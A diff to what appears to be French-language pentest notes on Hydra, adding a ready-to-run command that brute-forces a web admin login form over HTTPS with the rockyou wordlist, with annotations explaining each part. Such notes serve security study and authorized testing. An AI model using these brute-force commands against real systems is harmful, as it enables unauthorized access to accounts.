@@ -29,6 +29,20 @@ hydra [options] [target] [protocole]
 
 # Exemple basique
 hydra -l admin -p password 192.168.1.100 ssh
+
+hydra -l admin \
+  -P Cyber/rockyou.txt \
+  IP CIBLE \
+  https-post-form \
+  "/webadmin/Login.action:username=^USER^&password=^PASS^:showAlert=true" \
+  -s 443 \
+  -f \
+  -V
+
+  https-post-form = MODULE ATTAQUE
+  /webadmin/Login.action = CHEMIN VERS LE FORMULAIRE
+  username=^USER^&password=^PASS^ = REQUETE POST DU FORMULAIRE
+  showAlert=true" = SIGNALE ERREUR QUAND LOG INCORRECT
 ```
 
 ### Options principales
